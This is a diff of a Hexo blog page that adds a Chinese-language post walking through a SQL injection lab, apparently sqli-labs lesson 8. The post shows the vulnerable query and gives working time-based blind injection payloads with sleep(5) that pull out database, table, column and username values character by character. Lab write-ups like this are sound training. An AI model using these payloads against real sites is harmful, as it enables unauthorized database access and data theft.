@@ -5,14 +5,19 @@
   
 
   
-  <title>Archives: 2020/12 | Hexo</title>
+  <title>mysql | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2020/12/index.html">
+  <meta name="description" content="一.爆库首先输入—— 1?id&#x3D;1--+  页面回显you are in 接着打开源码查看到—— 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;  则注入点为 ‘   ，输入语句—— 1?id&#x3D;0&#39; or 1&#x3D;1--+  回显正确。那么这时我觉得">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mysql">
+<meta property="og:url" content="http://example.com/2020/12/13/blog%20i/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一.爆库首先输入—— 1?id&#x3D;1--+  页面回显you are in 接着打开源码查看到—— 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;  则注入点为 ‘   ，输入语句—— 1?id&#x3D;0&#39; or 1&#x3D;1--+  回显正确。那么这时我觉得">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-12-13T07:23:18.000Z">
+<meta property="article:modified_time" content="2020-12-13T09:07:01.786Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="lessen8">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
@@ -62,78 +67,80 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main">
-  
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2020/12/13/blog%20i/" class="archive-article-date">
-  <time datetime="2020-12-13T07:23:18.000Z" itemprop="datePublished">Dec 13</time>
+        <section id="main"><article id="post-blog i" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/12/13/blog%20i/" class="article-date">
+  <time datetime="2020-12-13T07:23:18.000Z" itemprop="datePublished">2020-12-13</time>
 </a>
-      
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/12/13/blog%20i/">mysql</a>
+    <h1 class="article-title" itemprop="name">
+      mysql
     </h1>
   
 
-    </header>
-  </div>
-</article>
-  
+      </header>
     
-    
-    <article class="archive-article archive-type-blog">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2020/12/07/blog%20h/" class="archive-article-date">
-  <time datetime="2020-12-07T08:25:42.000Z" itemprop="datePublished">Dec 7</time>
-</a>
+    <div class="article-entry" itemprop="articleBody">
       
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/12/07/blog%20h/">mysql</a>
-    </h1>
-  
+        <h4 id="一-爆库"><a href="#一-爆库" class="headerlink" title="一.爆库"></a>一.爆库</h4><p>首先输入——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1--+</span><br></pre></td></tr></table></figure>
 
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2020/12/01/blog9/" class="archive-article-date">
-  <time datetime="2020-12-01T13:08:21.000Z" itemprop="datePublished">Dec 1</time>
-</a>
+<p>页面回显you are in</p>
+<p>接着打开源码查看到——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>则注入点为 ‘   ，输入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; or 1&#x3D;1--+</span><br></pre></td></tr></table></figure>
+
+<p>回显正确。那么这时我觉得这和lesson5有什么区别呢？查看源代码发现——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;print_r(mysql_error());</span><br></pre></td></tr></table></figure>
+
+<p>他对mysql报错语句进行了注释，即这关不能用报错注入。</p>
+<p>于是我用布尔盲注，我发现不管我输入语句判断正确与否他返回的都是you are in那么说明我们想要使用布尔盲注也是不行的。那么最后尝试一下时间盲注，输入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+</span><br><span class="line">或</span><br><span class="line">?id&#x3D;1&#39;and If(substr(database(),1,1)&#x3D;&#39;s&#39;,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+
+<p>发现可以行得通，那么本题使用时间盲注无疑了。</p>
+<h4 id="二-爆表"><a href="#二-爆表" class="headerlink" title="二.爆表"></a>二.爆表</h4><p>输入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and If(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;limit 0,1),1,1)&#x3D;&#39;e&#39;,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+
+<h4 id="三-爆列"><a href="#三-爆列" class="headerlink" title="三.爆列"></a>三.爆列</h4><p>输入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and If(substr((select column_name from information_schema.columns where table_schema&#x3D;database()limit 0,1),1,1)&#x3D;&#39;i&#39;,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+
+<h4 id="四-爆值"><a href="#四-爆值" class="headerlink" title="四.爆值"></a>四.爆值</h4><p>输入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if(substr((select username from users limit 0,1),1,1)&#x3D;&#39;D&#39;,1,sleep(5)) --+</span><br></pre></td></tr></table></figure>
+
+
       
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/12/01/blog9/">C语言学习第六章</a>
-    </h1>
-  
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/12/13/blog%20i/" data-id="ckimwn2re0000agvu17j3h1y7" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/lessen8/" rel="tag">lessen8</a></li></ul>
 
-    </header>
+    </footer>
   </div>
-</article>
+  
+    
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2020/12/07/blog%20h/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">mysql</div>
+    </a>
   
+</nav>
 
+  
+</article>
 
 </section>
         
